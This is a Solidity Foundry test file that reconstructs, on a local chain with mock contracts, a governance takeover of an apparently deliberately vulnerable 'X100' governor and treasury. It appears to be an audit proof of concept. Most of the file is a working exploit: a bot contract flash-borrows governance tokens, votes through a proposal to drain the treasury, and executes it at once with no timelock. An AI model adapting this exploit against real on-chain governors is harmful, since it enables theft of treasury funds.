// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {MockFlashLender, IFlashBorrower} from "../contracts/mocks/MockFlashLender.sol";
import {VulnX100Governor, IVotesLike} from "../contracts/targets/VulnX100Governor.sol";
import {VulnX100Treasury} from "../contracts/targets/VulnX100Treasury.sol";

/// Bot that flash-borrows governance tokens and votes YES on a drain proposal.
contract KillChainBot is IFlashBorrower {
    MockFlashLender lender;
    MockERC20 token;
    VulnX100Governor gov;
    uint256 pid;

    constructor(MockFlashLender _l, MockERC20 _t, VulnX100Governor _g) {
        lender = _l; token = _t; gov = _g;
    }
    function voteWithLoan(uint256 _pid, uint256 amount) external {
        pid = _pid;
        lender.flashLoan(amount);
    }
    function onFlashLoan(address _token, uint256 amount) external {
        gov.castVote(pid, true);
        MockERC20(_token).transfer(address(lender), amount);
    }
}

/// End-to-end reconstruction of the X100 governance takeover on a LOCAL TEST CHAIN.
/// Chains [VULN-2] flash-loan votes + [VULN-3] no timelock + [VULN-4] over-privileged
/// treasury into a single capital-light drain. No real assets; simulation only.
contract X100KillChainTest is Test {
    MockERC20 gt;     // governance token
    MockERC20 usdc;   // treasury asset
    MockFlashLender lender;
    VulnX100Governor gov;
    VulnX100Treasury treasury;

    address attacker = makeAddr("attacker");

    function setUp() public {
        gt = new MockERC20("X100", "X100");
        usdc = new MockERC20("USD Coin", "USDC");
        gov = new VulnX100Governor(IVotesLike(address(gt)));
        treasury = new VulnX100Treasury();
        treasury.setGovernor(address(gov));
        gov.setTreasury(address(treasury));

        // Supply 1,000,000; lender pool 600,000; rest locked/staked elsewhere.
        lender = new MockFlashLender(gt);
        gt.mint(address(lender), 600_000e18);
        gt.mint(address(0xdead), 400_000e18);

        // Treasury holds 5,000,000 simulated USDC.
        usdc.mint(address(treasury), 5_000_000e18);
    }

    function test_x100_full_kill_chain() public {
        assertEq(usdc.balanceOf(address(treasury)), 5_000_000e18, "treasury funded");
        assertEq(gt.balanceOf(attacker), 0, "attacker has no governance tokens");

        // Step 1: attacker submits a drain proposal (propose is permissionless).
        bytes memory drain = abi.encodeWithSignature(
            "transfer(address,uint256)", attacker, 5_000_000e18
        );
        vm.prank(attacker);
        uint256 id = gov.propose(address(usdc), 0, drain);

        // Step 2: flash-borrow 600k governance tokens and vote YES (quorum = 200k).
        KillChainBot bot = new KillChainBot(lender, gt, gov);
        vm.prank(attacker);
        bot.voteWithLoan(id, 600_000e18);

        (, , uint256 forVotes, , uint64 deadline, ) = gov.proposalInfo(id);
        assertEq(forVotes, 600_000e18, "flash-loaned YES votes recorded");

        // Step 3: no timelock — execute the instant the 1s voting window closes.
        vm.warp(deadline + 1);
        gov.execute(id);

        // Outcome: treasury fully drained to an attacker who posted ~zero capital.
        assertEq(usdc.balanceOf(attacker), 5_000_000e18, "EVIDENCE: attacker drained treasury");
        assertEq(usdc.balanceOf(address(treasury)), 0, "EVIDENCE: treasury at zero");
        assertEq(gt.balanceOf(attacker), 0, "EVIDENCE: flash loan repaid, zero token cost");
        console2.log("X100 kill chain: USDC stolen (1e18):", usdc.balanceOf(attacker) / 1e18);
    }
}
